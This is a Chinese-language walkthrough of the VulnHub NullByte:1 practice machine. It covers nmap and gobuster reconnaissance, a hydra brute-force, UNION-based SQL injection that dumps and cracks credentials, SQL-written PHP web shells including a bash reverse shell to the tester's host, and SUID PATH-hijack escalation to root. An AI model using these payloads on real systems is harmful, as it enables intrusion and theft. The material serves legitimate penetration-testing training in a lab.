# NullByte:1 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/nullbyte-1,126/
-   下载地址：https://download.vulnhub.com/nullbyte/NullByte.ova.zip



## 信息收集：

### 主机发现：

```shell
❯ sudo nmap -sn 192.168.2.1/24                                    
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 20:58 HKT
Nmap scan report for 192.168.2.1
Host is up (0.0030s latency).
MAC Address: AA:A1:59:52:23:67 (Unknown)
Nmap scan report for 192.168.2.2
Host is up (0.0022s latency).
MAC Address: 00:50:56:E9:75:CA (VMware)
Nmap scan report for 192.168.2.147
Host is up (0.00092s latency).
MAC Address: 00:0C:29:5D:65:77 (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.00019s lßßatency).
MAC Address: 00:50:56:E6:75:62 (VMware)
Nmap scan report for 192.168.2.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.03 seconds
```



### 端口扫描

```shell
# TCP扫描
❯ sudo nmap --min-rate 10000 -sT -p- 192.168.2.147 -oA Nmap-scan/Ports      
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 21:00 HKT
Nmap scan report for 192.168.2.147
Host is up (0.0015s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
777/tcp   open  multiling-http
48107/tcp open  unknown
MAC Address: 00:0C:29:5D:65:77 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds

# UDP扫描
❯ sudo nmap --min-rate 10000 -sU -p- 192.168.2.147 -oA Nmap-scan/Ports-sU 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 21:00 HKT
Warning: 192.168.2.147 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.2.147
Host is up (0.00074s latency).
Not shown: 65454 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT      STATE SERVICE
111/udp   open  rpcbind
5353/udp  open  zeroconf
40979/udp open  unknown
MAC Address: 00:0C:29:5D:65:77 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 73.12 seconds
```



### 服务及系统版本探测

```shell
❯ sudo nmap -sC -sV -O -p80,111,777,5353,40979,48107 192.168.2.147 -oA Nmap-scan/sC
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 21:04 HKT
Nmap scan report for 192.168.2.147
Host is up (0.00072s latency).

PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40979/udp   status
|   100024  1          45934/udp6  status
|   100024  1          48107/tcp   status
|_  100024  1          58354/tcp6  status
777/tcp   open   ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
5353/tcp  closed mdns
40979/tcp closed unknown
48107/tcp open   status  1 (RPC #100024)
MAC Address: 00:0C:29:5D:65:77 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds

```



### 基础漏洞扫描

```shell
❯ sudo nmap --script=vuln -p80,111,777,5353,40979,48107 192.168.2.147 -oA Nmap-scan/Script
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-08 21:21 HKT
Pre-scan script results:
| broadcast-avahi-dos:   
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.147
Host is up (0.00048s latency).

PORT      STATE  SERVICE
80/tcp    open   http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|_  /uploads/: Potentially interesting folder
111/tcp   open   rpcbind
777/tcp   open   multiling-http
5353/tcp  closed mdns
40979/tcp closed unknown
48107/tcp open   unknown
MAC Address: 00:0C:29:5D:65:77 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 345.94 seconds
```



## web 发现

-   默认页
-   ![image-20230608210805376](https://raw.githubusercontent.com/r0o983/images/main/image-20230608210805376.png)

### 使用`gobuster`进行初步扫描

```shell
❯ sudo gobuster dir -u http://192.168.2.147 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
[sudo] password for kali: 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.147
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/08 21:06:46 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 316] [--> http://192.168.2.147/uploads/]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.2.147/javascript/]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://192.168.2.147/phpmyadmin/]
/server-status        (Status: 403) [Size: 301]
Progress: 218851 / 220561 (99.22%)
===============================================================
2023/06/08 21:07:34 Finished
===============================================================
```

-   经过多次扫描仍然没有获得任何有效信息。



### 使用exiftool查看图片信息

```shell
❯ exiftool main.gif 
ExifTool Version Number         : 12.57
File Name                       : main.gif
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2015:08:02 00:39:30+08:00
File Access Date/Time           : 2023:06:08 21:11:44+08:00
File Inode Change Date/Time     : 2023:06:08 21:11:38+08:00
File Permissions                : -rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
```

-   将`Comment`给出的提示信息放入url进行测试，发现存在一个新页面
-   ![image-20230609093326204](https://raw.githubusercontent.com/r0o983/images/main/image-20230609093326204.png)
-   查看源代码提示密码并不复杂，使用爆破工具进行爆破
-   ![image-20230609093659317](https://raw.githubusercontent.com/r0o983/images/main/image-20230609093659317.png)



### 使用hydra进行爆破

```shell
❯ hydra 192.168.2.147 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l test -P /usr/share/wordlists/rockyou.txt
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-09 09:44:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.2.147:80/kzMb5nVYJw/index.php:key=^PASS^:invalid key
[STATUS] 4452.00 tries/min, 4452 tries in 00:01h, 14339947 to do in 53:42h, 16 active
[STATUS] 4538.67 tries/min, 13616 tries in 00:03h, 14330783 to do in 52:38h, 16 active
[80][http-post-form] host: 192.168.2.147   login: test   password: elite
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-09 09:50:31

参数释义：
	^PASS^ 爆破的密码位置
	http-form-post	表单提交方式
	invalid key 是一个表示认证失败的响应字符串，用于判断密码是否正确
```

-   成功获得密码：`elite`，输入密码进入以下页面
-   ![image-20230609095747298](https://raw.githubusercontent.com/r0o983/images/main/image-20230609095747298.png)
-   经过测试，输入任意不存在的字符会提示`Fetched data successfully` ，输入当前字符的任意字符都会查出数据，应该是使用的模糊查询
-   ![image-20230609100049931](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100049931.png)



### sql注入

-   输入双引号会触发sql语句报错

-   ![image-20230609100151364](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100151364.png)

-   构建sql语句，查看当前有几列数据`" order by 4 -- `查询到第四列数据时进行报错

-   ![image-20230609100412683](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100412683.png)

-   查看回显点`" union select 1,2,3 -- `

-   ![image-20230609100519574](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100519574.png)

-   查看当前的库信息，版本信息，用户信息`" union select version(),database(),user() -- -  `

-   ![image-20230609100723443](https://raw.githubusercontent.com/r0o983/images/main/image-20230609100723443.png)

-   列出当前所有表的信息，通过读取`information_schema`表 ` " union select table_schema,table_name,3 from information_schema.tables; -- - `

-   ![image-20230726104342105](https://raw.githubusercontent.com/r0o983/images/main/image-20230726104342105.png)

-   查找当前数据库的表`seth`,读取具体信息`" union select table_name,2,3 from information_schema.tables='seth'; -- - `

-   ![image-20230728185132250](https://raw.githubusercontent.com/r0o983/images/main/image-20230728185132250.png)

-   查询当前`users`表的字段，`" union select column_name,2,3 from information_schema.columns where table_schema='seth' and  table_name='users'; -- -`

-   ![image-20230728185342962](https://raw.githubusercontent.com/r0o983/images/main/image-20230728185342962.png)

-   根据回显位置直接查出`id,user,pass`信息`" union select id,user,pass from users -- - `

-   ![image-20230728185518364](https://raw.githubusercontent.com/r0o983/images/main/image-20230728185518364.png)

-   获得ramses用户的密码：`YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE`

-   使用kali自带的解码工具或者直接浏览器搜索解密即可得到以下字符串

-   ```shell
    ❯ echo -n "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" | base64  -d
    c6d6bd7ebf806f43c76acc3681703b81
    ```

-   使用md5将字符串进行解密，使用hashcat或者john都可以进行破解，语法类似效果相同。

-   ```shell
    hashcat -m 0 -a 0 crash /usr/share/wordlists/rockyou.txt     
    hashcat (v6.2.6) starting
    
    OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
    ==================================================================================================================================================
    * Device #1: pthread-sandybridge-Intel(R) Core(TM) i5-10500 CPU @ 3.10GHz, 2910/5884 MB (1024 MB allocatable), 4MCU
    
    Minimum password length supported by kernel: 0
    Maximum password length supported by kernel: 256
    
    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    Rules: 1
    
    Optimizers applied:
    * Zero-Byte
    * Early-Skip
    * Not-Salted
    * Not-Iterated
    * Single-Hash
    * Single-Salt
    * Raw-Hash
    
    ATTENTION! Pure (unoptimized) backend kernels selected.
    Pure kernels can crack longer passwords, but drastically reduce performance.
    If you want to switch to optimized kernels, append -O to your commandline.
    See the above message to find out about the exact limits.
    
    Watchdog: Temperature abort trigger set to 90c
    
    Host memory required for this attack: 1 MB
    
    Dictionary cache hit:
    * Filename..: /usr/share/wordlists/rockyou.txt
    * Passwords.: 14344385
    * Bytes.....: 139921507
    * Keyspace..: 14344385
    
    c6d6bd7ebf806f43c76acc3681703b81:omega                    
                                                             
    ```

-   得到用户名以及密码：ramses，密码：omega

### sql注入2

-   使用sql注入直接写入一个`php`的小马到之前探测到的`/uploads`文件夹下。

-   >   " union select "<?php system($_GET['cmd']); ?>","","" into outfile "/var/www/html/uploads/shell.php" -- - 

-   尝试访问

-   ![image-20230729124025790](https://raw.githubusercontent.com/r0o983/images/main/image-20230729124025790.png)

-   读取当前数据库的配置文件,当前sql查询页面`kzMb5nVYJw/420search.php`

-   ```shell
    ❯ curl http://192.168.2.147/uploads/shell.php\?cmd\=cat%20/var/www/html/kzMb5nVYJw/420search.php 
    1       ramses
    2       isis    employee
    <?php
    $word = $_GET["usrtosearch"];
    
    $dbhost = 'localhost:3036';
    $dbuser = 'root';
    $dbpass = 'sunnyvale';
    $conn = mysql_connect($dbhost, $dbuser, $dbpass);
    if(! $conn )
    {
      die('Could not connect: ' . mysql_error());
    }
    $sql = 'SELECT id, user, position FROM users WHERE user LIKE "%'.$word.'%" ';
    
    mysql_select_db('seth');
    $retval = mysql_query( $sql, $conn );
    if(! $retval )
    {
      die('Could not get data: ' . mysql_error());
    }
    while($row = mysql_fetch_array($retval, MYSQL_ASSOC))
    {
        echo "EMP ID :{$row['id']}  <br> ".
             "EMP NAME : {$row['user']} <br> ".
             "EMP POSITION : {$row['position']} <br> ".
             "--------------------------------<br>";
    } 
    echo "Fetched data successfully\n";
    mysql_close($conn);
    
    ?>
    
    ```

-   成功登陆`phpmyadmin`页面

-   ![image-20230729131622659](https://raw.githubusercontent.com/r0o983/images/main/image-20230729131622659.png)

### sql注入3

通过sql注入直接写入大马，写入到`/uploads/`文件夹下。

```SHELL
" union select "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.2/1234 0>&1 '\"); ?>","","" into outfile "/var/www/html/uploads/sh.php"; -- - 
```

- 在本机开启监听，访问上传点获得初始shell

- ```SHELL
  └─$ nc -nvlp 1234
  listening on [any] 1234 ...
  connect to [192.168.2.2] from (UNKNOWN) [192.168.2.3] 42151
  bash: cannot set terminal process group (574): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@NullByte:/var/www/html/uploads$ whoami
  whoami
  www-data
  www-data@NullByte:/var/www/html/uploads$ ip a
  ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
      link/ether 00:0c:29:98:28:e2 brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.3/24 brd 192.168.2.255 scope global eth0
         valid_lft forever preferred_lft forever
      inet6 fe80::20c:29ff:fe98:28e2/64 scope link 
         valid_lft forever preferred_lft forever
  www-data@NullByte:/var/www/html/uploads$ uname -a
  uname -a
  Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
  www-data@NullByte:/var/www/html/uploads$    
  ```

- 

## 获取初始权限

-   使用刚才获取的用户名以及密码尝试进行ssh登陆

-   ```shell
    root@567701cfe966:/var/www/html/sql-connections# ssh ramses@192.168.2.147 -p 777
    ramses@192.168.2.147's password: 
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Wed Jul 12 21:49:51 2023 from 192.168.2.128
    ramses@NullByte:~$ uname -a
    Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
    ramses@NullByte:~$  ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
        link/ether 00:0c:29:5d:65:77 brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.147/24 brd 192.168.2.255 scope global eth0
           valid_lft forever preferred_lft forever
        inet6 fe80::20c:29ff:fe5d:6577/64 scope link 
           valid_lft forever preferred_lft forever
    ramses@NullByte:~$ whoami
    ramses
    
    ```

### 提权

-   尝试使用`sudo -l ` 发现当前用户无法使用sudo

-   ```shell
    ramses@NullByte:~$ sudo -l
    [sudo] password for ramses: 
    Sorry, user ramses may not run sudo on NullByte.
    ```

-   无定时任务

-   ```shell
    ramses@NullByte:~$ cat /etc/crontab 
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.
    
    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
    
    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    ramses@NullByte:~$ 
    
    ```

-   在`home`目录下，发现一个`.bash_history`文件，查看其内容发现敏感目录

-   ```shell
    ramses@NullByte:~$ ls -lhai
    total 24K
    477 drwxr-xr-x 2 ramses ramses 4.0K Aug  2  2015 .
     22 drwxr-xr-x 5 root   root   4.0K Aug  2  2015 ..
    609 -rw------- 1 ramses ramses  134 Jul  3 23:15 .bash_history
    480 -rw-r--r-- 1 ramses ramses  220 Aug  2  2015 .bash_logout
    482 -rw-r--r-- 1 ramses ramses 3.5K Aug  2  2015 .bashrc
    481 -rw-r--r-- 1 ramses ramses  675 Aug  2  2015 .profile
    ramses@NullByte:~$ cat .bash_history 
    sudo -s
    su eric
    exit
    ls
    clear
    cd /var/www
    cd backup/
    ls
    ./procwatch 
    clear
    sudo -s
    cd /
    ls
    exit
    ipa
    ip a
    whoami
    uname -a
    sudo -l
    exit
    ```

- 在`/var/www/html`文件夹下存在一个可执行文件，该文件存在`suid`权限，尝试执行该命令后发现执行了两个指令。

- ```shell
  ramses@NullByte:/var/www/backup$ ls -lhai
  total 20K
  401863 drwxrwxrwx 2 root root 4.0K Aug  2  2015 .
  389537 drwxr-xr-x 4 root root 4.0K Aug  2  2015 ..
  391947 -rwsr-xr-x 1 root root 4.9K Aug  2  2015 procwatch
  401064 -rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
  ramses@NullByte:/var/www/backup$ ./procwatch 
    PID TTY          TIME CMD
  20452 pts/0    00:00:00 procwatch
  20453 pts/0    00:00:00 sh
  20454 pts/0    00:00:00 ps
  ramses@NullByte:/var/www/backup$ 
  ```

- 使用软链接将`/bin/sh`连接到ps中，并添加当前路径，由于文件具有`suid`权限，所以在执行这一步后会获得`root`权限

- ```shell
  ramses@NullByte:/var/www/backup$ ./procwatch 
  # whoami
  root
  # uname -a
  Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
  # ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default 
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
      link/ether 00:0c:29:98:28:e2 brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.3/24 brd 192.168.2.255 scope global eth0
         valid_lft forever preferred_lft forever
      inet6 fe80::20c:29ff:fe98:28e2/64 scope link 
         valid_lft forever preferred_lft forever
  #
  ```

-   
